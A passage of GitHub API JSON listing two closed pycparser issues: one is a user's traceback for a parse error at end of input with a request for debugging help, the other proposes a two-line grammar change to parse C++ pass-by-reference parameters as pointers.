"https://api.github.com/users/davidaharon/gists{/gist_id}", "starred_url": "https://api.github.com/users/davidaharon/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/davidaharon/subscriptions", "organizations_url": "https://api.github.com/users/davidaharon/orgs", "repos_url": "https://api.github.com/users/davidaharon/repos", "events_url": "https://api.github.com/users/davidaharon/events{/privacy}", "received_events_url": "https://api.github.com/users/davidaharon/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2018-03-05T12:29:35Z", "updated_at": "2018-03-08T14:21:00Z", "closed_at": "2018-03-08T14:21:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am trying to parse .i file and getting the following error:\r\nTraceback (most recent call last):\r\n\r\n  File \"C:/Work/REL_06_02_00_10_exception_after_CFUN_0/Tools/VarsExporter/BuildExportedDb.py\", line 1076, in <module>\r\nUNHANDELED EXCEPTION: BuildExportedDb.py\r\n    main()\r\n\r\n  File \"C:/Work/REL_06_02_00_10_exception_after_CFUN_0/Tools/VarsExporter/BuildExportedDb.py\", line 1032, in main\r\n    ast = parse_file(i_file)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\__init__.py\", line 93, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\c_parser.py\", line 1763, in p_error\r\n    self._parse_error('At end of input', self.clex.filename)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\nParseError: Obj\\ServiceDb.i: At end of input\r\n\r\nAny suggestions how can I debug it, and find out what's going on?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/237", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/237/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/237/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/237/events", "html_url": "https://github.com/eliben/pycparser/issues/237", "id": 301885180, "node_id": "MDU6SXNzdWUzMDE4ODUxODA=", "number": 237, "title": "Add parsing of pass-by-reference parameters", "user": {"login": "natezb", "id": 3268059, "node_id": "MDQ6VXNlcjMyNjgwNTk=", "avatar_url": "https://avatars2.githubusercontent.com/u/3268059?v=4", "gravatar_id": "", "url": "https://api.github.com/users/natezb", "html_url": "https://github.com/natezb", "followers_url": "https://api.github.com/users/natezb/followers", "following_url": "https://api.github.com/users/natezb/following{/other_user}", "gists_url": "https://api.github.com/users/natezb/gists{/gist_id}", "starred_url": "https://api.github.com/users/natezb/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/natezb/subscriptions", "organizations_url": "https://api.github.com/users/natezb/orgs", "repos_url": "https://api.github.com/users/natezb/repos", "events_url": "https://api.github.com/users/natezb/events{/privacy}", "received_events_url": "https://api.github.com/users/natezb/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-03-02T19:52:46Z", "updated_at": "2018-03-07T22:30:27Z", "closed_at": "2018-03-07T22:30:27Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I know this is a C++ feature, but the patch required is only 2 lines, so I thought I'd check.\r\n\r\nI often encounter headers written for MSVC that are mostly C, with the occasional C++-ism. I usually do some preprocessing to normalize them before sending to pycparser, but this is pretty difficult to do for the pass-by-reference syntax without essentially writing a parser.\r\n\r\nWhat I'd like to do is to simply interpret pass-by-reference as pass-by-pointer (e.g. parse `func(int &x);` as `func(int *x);`. This can be done by adding two lines to the `pointer` production so that it reads:\r\n\r\n```\r\npointer : TIMES type_qualifier_list_opt\r\n        | TIMES type_qualifier_list_opt pointer\r\n        | AND type_qualifier_list_opt\r\n        | AND type_qualifier_list_opt pointer\r\n```", "performed_via_github_app": null, "score": 1.0}]}